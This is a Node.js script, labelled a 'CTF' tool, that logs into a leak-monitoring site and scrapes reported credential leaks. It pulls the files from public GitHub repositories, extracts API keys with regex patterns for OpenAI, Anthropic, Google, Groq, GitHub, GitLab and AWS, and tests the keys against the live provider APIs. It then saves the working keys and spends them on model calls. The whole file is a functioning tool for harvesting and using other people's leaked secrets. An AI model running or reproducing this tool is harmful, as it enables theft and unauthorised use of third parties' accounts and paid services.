#!/usr/bin/env node

/**
 * CTF Key Hunter v2 - apiradar.live (Parallelized)
 *
 * Usage:
 *   node scripts/llm-hunt-blogs/key-hunter/ctf-key-hunter.js --login
 *   node scripts/llm-hunt-blogs/key-hunter/ctf-key-hunter.js --pages=20
 *   node scripts/llm-hunt-blogs/key-hunter/ctf-key-hunter.js --test
 *   node scripts/llm-hunt-blogs/key-hunter/ctf-key-hunter.js --provider=google --test
 *   node scripts/llm-hunt-blogs/key-hunter/ctf-key-hunter.js --call
 *   node scripts/llm-hunt-blogs/key-hunter/ctf-key-hunter.js --working
 *   node scripts/llm-hunt-blogs/key-hunter/ctf-key-hunter.js --pFetch=30 --pTest=10 --test
 */

const fs = require('fs');
const path = require('path');

// ─── Config ───────────────────────────────────────────────────────

const DATA_DIR = path.resolve(__dirname, '..', 'data');
const COOKIE_FILE = path.resolve(__dirname, '.ctf-cookies.txt');
const OUTPUT_FILE = path.resolve(DATA_DIR, 'ctf-keys.json');
const VALID_FILE = path.resolve(DATA_DIR, 'ctf-keys-valid.json');
const WORKING_FILE = path.resolve(DATA_DIR, 'ctf-keys-working.json');
const BASE = 'https://apiradar.live';

// data 디렉토리 보장
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const ARGS = (() => {
  const a = {
    pages: 100, limit: 50, provider: null,
    test: false, login: false, call: false, working: false,
    pFetch: 24, pTest: 8, pPage: 6,
  };
  for (const arg of process.argv.slice(2)) {
    const [k, v] = arg.split('=');
    if (k === '--pages') a.pages = +v;
    if (k === '--limit') a.limit = +v;
    if (k === '--provider') a.provider = v;
    if (k === '--test') a.test = true;
    if (k === '--login') a.login = true;
    if (k === '--call') a.call = true;
    if (k === '--working') a.working = true;
    if (k === '--pFetch') a.pFetch = +v;
    if (k === '--pTest') a.pTest = +v;
    if (k === '--pPage') a.pPage = +v;
  }
  return a;
})();

// ─── Parallel Map ─────────────────────────────────────────────────

async function mapLimit(items, limit, fn) {
  const out = new Array(items.length);
  let i = 0;
  async function worker() {
    while (i < items.length) {
      const idx = i++;
      out[idx] = await fn(items[idx], idx);
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, worker));
  return out;
}

// ─── Fetch with retry + backoff ───────────────────────────────────

async function fetchRetry(url, opts = {}, retries = 3) {
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const res = await fetch(url, { signal: AbortSignal.timeout(12000), ...opts });
      if (res.status === 429 || res.status >= 500) {
        const wait = Math.pow(2, attempt) * 500;
        await new Promise((r) => setTimeout(r, wait));
        continue;
      }
      return res;
    } catch (e) {
      if (attempt === retries - 1) return null;
      await new Promise((r) => setTimeout(r, 500));
    }
  }
  return null;
}

// ─── Cookie ───────────────────────────────────────────────────────

async function loginAndSaveCookies() {
  let chromium;
  try { chromium = require('playwright').chromium; }
  catch { console.error('playwright 필요: npm i -D playwright'); process.exit(1); }

  console.log('[LOGIN] Chrome 열림. Google 로그인 후 자동 저장.');
  const browser = await chromium.launch({ channel: 'chrome', headless: false });
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  await page.goto(`${BASE}/explore`, { waitUntil: 'networkidle' });

  for (let i = 0; i < 120; i++) {
    await new Promise((r) => setTimeout(r, 1000));
    try {
      const r = await page.evaluate(async () => {
        const res = await fetch('/api/leaks?page=1&limit=1&timeRange=all&sortBy=newest');
        return (await res.json()).planLimits?.maxLeaks;
      });
      if (r == null) {
        const cookies = await ctx.cookies();
        const str = cookies.filter((c) => c.domain.includes('apiradar')).map((c) => `${c.name}=${c.value}`).join('; ');
        fs.writeFileSync(COOKIE_FILE, str);
        console.log(`쿠키 저장 완료. ${cookies.length}개`);
        await browser.close();
        return;
      }
    } catch {}
  }
  console.log('2분 내 로그인 미감지.');
  await browser.close();
  process.exit(1);
}

function loadCookies() {
  if (!fs.existsSync(COOKIE_FILE)) { console.error('--login 먼저.'); process.exit(1); }
  return fs.readFileSync(COOKIE_FILE, 'utf-8').trim();
}

// ─── Phase 1: Collect (parallel pages) ────────────────────────────

async function collectLeaks(cookie) {
  const t = Date.now();
  process.stdout.write('[1] Collecting leaks... ');

  // Check session
  const chk = await fetchRetry(`${BASE}/api/leaks?page=1&limit=1&timeRange=all&sortBy=newest`, {
    headers: { Cookie: cookie, Accept: 'application/json' },
  });
  if (!chk) { console.log('FAIL'); process.exit(1); }
  const chkData = await chk.json();
  if (chkData.planLimits?.maxLeaks !== null) { console.log('쿠키 만료. --login 다시.'); process.exit(1); }

  const pages = Array.from({ length: ARGS.pages }, (_, i) => i + 1);

  const pageResults = await mapLimit(pages, ARGS.pPage, async (p) => {
    const res = await fetchRetry(
      `${BASE}/api/leaks?timeRange=all&sortBy=newest&page=${p}&limit=${ARGS.limit}`,
      { headers: { Cookie: cookie, Accept: 'application/json' } }
    );
    if (!res) return [];
    const data = await res.json();
    if (!data.leaks?.length) return [];

    let leaks = data.leaks.filter((l) => !l.isLocked);
    if (ARGS.provider) leaks = leaks.filter((l) => l.provider === ARGS.provider);
    return leaks;
  });
  const allLeaks = pageResults.flat();

  console.log(`${allLeaks.length} leaks (${((Date.now() - t) / 1000).toFixed(1)}s)`);
  return allLeaks;
}

// ─── Phase 2: Dedup + parallel GitHub fetch ───────────────────────

async function extractKeys(leaks) {
  const t = Date.now();

  // Dedup by repoUrl+filePath
  const seen = new Set();
  const unique = leaks.filter((l) => {
    const k = `${l.repoUrl}|${l.filePath}`;
    if (seen.has(k)) return false;
    seen.add(k); return true;
  });

  process.stdout.write(`[2] GitHub fetch: ${unique.length} unique files (deduped from ${leaks.length})... `);

  const categorized = { openai: [], anthropic: [], google: [], grok: [], other: [] };
  let found = 0, skip = 0;

  await mapLimit(unique, ARGS.pFetch, async (leak) => {
    const content = await githubRaw(leak.repoUrl, leak.filePath);
    if (!content) { skip++; return; }

    const keys = parseKeys(content);
    if (!keys.length) { skip++; return; }

    found += keys.length;
    for (const key of keys) {
      const cat = categorize(key);
      categorized[cat].push({
        key, provider: leak.provider,
        repo: leak.repoUrl, file: leak.filePath,
        detectedAt: leak.leakDetectedAt, validation: null,
      });
    }
  });

  // Dedup by key value
  for (const cat of Object.keys(categorized)) {
    const s = new Set();
    categorized[cat] = categorized[cat].filter((e) => {
      if (s.has(e.key)) return false;
      s.add(e.key); return true;
    });
  }

  const total = Object.values(categorized).flat().length;
  console.log(`${total} unique keys, ${skip} skipped (${((Date.now() - t) / 1000).toFixed(1)}s)`);
  return categorized;
}

async function githubRaw(repoUrl, filePath) {
  const repo = repoUrl.replace('https://github.com/', '');
  for (const br of ['main', 'master']) {
    const res = await fetchRetry(`https://raw.githubusercontent.com/${repo}/${br}/${filePath}`);
    if (res?.ok) return await res.text();
  }
  return null;
}

function parseKeys(content) {
  const patterns = [
    /sk-ant-[a-zA-Z0-9_-]{20,}/g,
    /sk-proj-[a-zA-Z0-9_-]{40,}/g,
    /sk-or-v1-[a-zA-Z0-9]{20,}/g,
    /sk-(?!ant-|proj-|or-)[a-zA-Z0-9]{32,}/g,
    /AIzaSy[0-9A-Za-z_-]{33}/g,
    /gsk_[a-zA-Z0-9]{20,}/g,
    /xai-[a-zA-Z0-9_-]{20,}/g,
    /ghp_[a-zA-Z0-9]{36}/g,
    /glpat-[a-zA-Z0-9_-]{20,}/g,
    /AKIA[0-9A-Z]{16}/g,
  ];

  const keys = new Set();
  for (const re of patterns)
    for (const m of (content.match(re) || []))
      if (!junk(m)) keys.add(m);

  const gen = /(?:api[_-]?key|token|password|auth)[\s]*[:=][\s]*["']?([a-zA-Z0-9_\-/.]{20,})["']?/gi;
  let m;
  while ((m = gen.exec(content)) !== null)
    if (m[1] && !junk(m[1]) && m[1].length < 200) keys.add(m[1]);

  return [...keys];
}

function junk(k) {
  const l = k.toLowerCase();
  return l.includes('your') || l.includes('xxx') || l.includes('placeholder') ||
    l.includes('example') || l.includes('${') || l.includes('change_me') ||
    l.includes('change-me') || l.includes('insert') || l.includes('secret') ||
    l.includes('internal') || l.includes('test-') || l.includes('-test') ||
    l.includes('dummy') || l.includes('sample') || /^[a-z_-]+$/i.test(k);
}

function categorize(key) {
  if (key.startsWith('sk-ant-')) return 'anthropic';
  if (key.startsWith('sk-proj-') || key.startsWith('sk-or-') || key.startsWith('sk-')) return 'openai';
  if (key.startsWith('AIzaSy')) return 'google';
  if (key.startsWith('gsk_') || key.startsWith('xai-')) return 'grok';
  return 'other';
}

// ─── Phase 3: Save ────────────────────────────────────────────────

function saveJSON(categorized) {
  const total = Object.values(categorized).flat().length;
  const output = {
    metadata: { crawledAt: new Date().toISOString(), totalKeys: total, breakdown: {} },
    keys: categorized,
  };
  for (const [c, a] of Object.entries(categorized)) if (a.length) output.metadata.breakdown[c] = a.length;
  fs.writeFileSync(OUTPUT_FILE, JSON.stringify(output, null, 2));
  console.log(`[3] Saved ${total} keys -> ${OUTPUT_FILE}`);
  return output;
}

// ─── Phase 4: Test validity (parallel) ────────────────────────────

const TESTER = {
  openai: (k) => fetchRetry('https://api.openai.com/v1/models', {
    headers: { Authorization: `Bearer ${k}` },
  }).then((r) => r?.status ?? 0),

  anthropic: (k) => fetchRetry('https://api.anthropic.com/v1/messages', {
    method: 'POST',
    headers: { 'x-api-key': k, 'anthropic-version': '2023-06-01', 'content-type': 'application/json' },
    body: JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 1, messages: [{ role: 'user', content: 'h' }] }),
  }).then((r) => r?.status ?? 0),

  google: (k) => fetchRetry(`https://generativelanguage.googleapis.com/v1/models?key=${k}`)
    .then((r) => r?.status ?? 0),

  grok: (k) => fetchRetry('https://api.groq.com/openai/v1/models', {
    headers: { Authorization: `Bearer ${k}` },
  }).then((r) => r?.status ?? 0),
};

async function testAllKeys(categorized) {
  const t = Date.now();
  const sum = { valid: 0, invalid: 0, rateLimited: 0 };
  let tested = 0;

  const allEntries = [];
  for (const [cat, entries] of Object.entries(categorized)) {
    if (!TESTER[cat]) continue;
    for (const e of entries) allEntries.push({ ...e, _cat: cat });
  }

  process.stdout.write(`[4] Testing ${allEntries.length} keys (parallel=${ARGS.pTest})... `);

  await mapLimit(allEntries, ARGS.pTest, async (entry) => {
    const s = await TESTER[entry._cat](entry.key);
    tested++;

    if (s === 200) { entry.validation = 'valid'; sum.valid++; }
    else if (s === 429) { entry.validation = 'rate_limited'; sum.rateLimited++; }
    else { entry.validation = 'invalid'; sum.invalid++; }

    // Write back to original
    const orig = categorized[entry._cat].find((e) => e.key === entry.key);
    if (orig) orig.validation = entry.validation;

    if (tested % 50 === 0) process.stdout.write(`${tested}..`);
  });

  console.log(`done (${((Date.now() - t) / 1000).toFixed(1)}s)`);
  console.log(`  VALID:${sum.valid}  INVALID:${sum.invalid}  RATE_LIMITED:${sum.rateLimited}`);
  return sum;
}

// ─── Phase 5: Call valid keys ─────────────────────────────────────

async function callValidKeys() {
  if (!fs.existsSync(VALID_FILE)) {
    console.error('valid 파일 없음. --test 먼저 실행.');
    process.exit(1);
  }

  const data = JSON.parse(fs.readFileSync(VALID_FILE, 'utf-8'));
  console.log('\n=== Valid Key API Call Test ===\n');

  // OpenAI: list models
  for (const entry of (data.openai || [])) {
    console.log(`[OpenAI] ${entry.key.substring(0, 25)}...`);
    try {
      const res = await fetchRetry('https://api.openai.com/v1/models', {
        headers: { Authorization: `Bearer ${entry.key}` },
      });
      if (res?.ok) {
        const body = await res.json();
        const models = body.data?.slice(0, 5).map((m) => m.id) || [];
        console.log(`  Models: ${models.join(', ')}${body.data?.length > 5 ? ` (+${body.data.length - 5} more)` : ''}`);
      } else {
        console.log(`  Status: ${res?.status}`);
      }
    } catch (e) { console.log(`  Error: ${e.message}`); }
  }

  // Anthropic: send minimal message
  for (const entry of (data.anthropic || [])) {
    console.log(`[Anthropic] ${entry.key.substring(0, 25)}...`);
    try {
      const res = await fetchRetry('https://api.anthropic.com/v1/messages', {
        method: 'POST',
        headers: { 'x-api-key': entry.key, 'anthropic-version': '2023-06-01', 'content-type': 'application/json' },
        body: JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 10, messages: [{ role: 'user', content: 'Say OK' }] }),
      });
      if (res?.ok) {
        const body = await res.json();
        console.log(`  Response: ${body.content?.[0]?.text || 'empty'}`);
        console.log(`  Model: ${body.model}, Usage: ${JSON.stringify(body.usage)}`);
      } else {
        console.log(`  Status: ${res?.status}`);
      }
    } catch (e) { console.log(`  Error: ${e.message}`); }
  }

  // Google: list models + generate
  for (const entry of (data.google || [])) {
    console.log(`[Google] ${entry.key.substring(0, 25)}...`);
    try {
      const res = await fetchRetry(`https://generativelanguage.googleapis.com/v1/models?key=${entry.key}`);
      if (res?.ok) {
        const body = await res.json();
        const gemini = (body.models || []).filter((m) => m.name?.includes('gemini')).slice(0, 3);
        console.log(`  Models: ${gemini.map((m) => m.name).join(', ') || 'none'} (total: ${body.models?.length || 0})`);

        // Try a generate call
        const genRes = await fetchRetry(
          `https://generativelanguage.googleapis.com/v1/models/gemini-2.0-flash:generateContent?key=${entry.key}`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ contents: [{ parts: [{ text: 'Say OK in 1 word' }] }] }),
          }
        );
        if (genRes?.ok) {
          const genBody = await genRes.json();
          const text = genBody.candidates?.[0]?.content?.parts?.[0]?.text || '';
          console.log(`  Generate: "${text.trim().substring(0, 100)}"`);
        } else {
          console.log(`  Generate: ${genRes?.status || 'failed'}`);
        }
      } else {
        console.log(`  Status: ${res?.status}`);
      }
    } catch (e) { console.log(`  Error: ${e.message}`); }
  }

  // Grok (Groq): list models
  for (const entry of (data.grok || [])) {
    console.log(`[Groq] ${entry.key.substring(0, 25)}...`);
    try {
      const res = await fetchRetry('https://api.groq.com/openai/v1/models', {
        headers: { Authorization: `Bearer ${entry.key}` },
      });
      if (res?.ok) {
        const body = await res.json();
        const models = body.data?.slice(0, 5).map((m) => m.id) || [];
        console.log(`  Models: ${models.join(', ')}${body.data?.length > 5 ? ` (+${body.data.length - 5} more)` : ''}`);
      } else {
        console.log(`  Status: ${res?.status}`);
      }
    } catch (e) { console.log(`  Error: ${e.message}`); }
  }
}

// ─── Phase 6: Generate working keys ──────────────────────────────

async function generateWorkingKeys(validKeys) {
  const t = Date.now();
  process.stdout.write('[6] Verifying working keys... ');
  const working = {};

  // OpenAI: list models
  for (const entry of (validKeys.openai || [])) {
    const res = await fetchRetry('https://api.openai.com/v1/models', {
      headers: { Authorization: `Bearer ${entry.key}` },
    });
    if (res?.ok) {
      const body = await res.json();
      if (!working.openai) working.openai = [];
      working.openai.push({
        key: entry.key, repo: entry.repo, file: entry.file,
        models: body.data?.length || 0,
      });
    }
  }

  // Google: must pass generateContent
  for (const entry of (validKeys.google || [])) {
    const res = await fetchRetry(
      `https://generativelanguage.googleapis.com/v1/models/gemini-2.0-flash:generateContent?key=${entry.key}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contents: [{ parts: [{ text: 'Say OK' }] }] }),
      }
    );
    if (res?.ok) {
      if (!working.google) working.google = [];
      working.google.push({ key: entry.key, repo: entry.repo, file: entry.file });
    }
  }

  // Groq: list models
  for (const entry of (validKeys.grok || [])) {
    const res = await fetchRetry('https://api.groq.com/openai/v1/models', {
      headers: { Authorization: `Bearer ${entry.key}` },
    });
    if (res?.ok) {
      const body = await res.json();
      if (!working.groq) working.groq = [];
      working.groq.push({
        key: entry.key, repo: entry.repo, file: entry.file,
        models: body.data?.length || 0,
      });
    }
  }

  const tmpFile = WORKING_FILE + '.tmp';
  fs.writeFileSync(tmpFile, JSON.stringify(working, null, 2));
  fs.renameSync(tmpFile, WORKING_FILE);
  const total = Object.values(working).flat().length;
  console.log(`${total} keys (${((Date.now() - t) / 1000).toFixed(1)}s) -> ${WORKING_FILE}`);
  return working;
}

// ─── Main ─────────────────────────────────────────────────────────

(async () => {
  const t0 = Date.now();
  console.log('=== CTF Key Hunter v2 ===');

  if (ARGS.login) return loginAndSaveCookies();
  if (ARGS.call) return callValidKeys();
  if (ARGS.working) {
    // --working: collect → extract → test → verify working → save
    console.log(`pages=${ARGS.pages} limit=${ARGS.limit} pFetch=${ARGS.pFetch} pTest=${ARGS.pTest}\n`);
    const cookie = loadCookies();
    const leaks = await collectLeaks(cookie);
    if (!leaks.length) { console.log('No leaks.'); process.exit(1); }
    const categorized = await extractKeys(leaks);
    saveJSON(categorized);
    await testAllKeys(categorized);
    const validOnly = {};
    for (const [c, es] of Object.entries(categorized)) {
      const v = es.filter((e) => e.validation === 'valid' || e.validation === 'rate_limited');
      if (v.length) validOnly[c] = v;
    }
    fs.writeFileSync(VALID_FILE, JSON.stringify(validOnly, null, 2));
    await generateWorkingKeys(validOnly);
    console.log(`\nTotal: ${((Date.now() - t0) / 1000).toFixed(1)}s`);
    return;
  }

  console.log(`pages=${ARGS.pages} limit=${ARGS.limit} provider=${ARGS.provider || 'all'} pFetch=${ARGS.pFetch} pTest=${ARGS.pTest}\n`);

  const cookie = loadCookies();

  // 1 + 2 + 3
  const leaks = await collectLeaks(cookie);
  if (!leaks.length) return console.log('No leaks.');
  const categorized = await extractKeys(leaks);
  const output = saveJSON(categorized);

  // 4
  if (ARGS.test) {
    await testAllKeys(categorized);

    // Update full output
    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(output, null, 2));

    // Save valid only
    const validOnly = {};
    for (const [c, es] of Object.entries(categorized)) {
      const v = es.filter((e) => e.validation === 'valid' || e.validation === 'rate_limited');
      if (v.length) validOnly[c] = v;
    }
    fs.writeFileSync(VALID_FILE, JSON.stringify(validOnly, null, 2));
    const validCount = Object.values(validOnly).flat().length;
    console.log(`[5] Valid: ${validCount} keys -> ${VALID_FILE}`);
  }

  console.log(`\nTotal: ${((Date.now() - t0) / 1000).toFixed(1)}s`);
})();
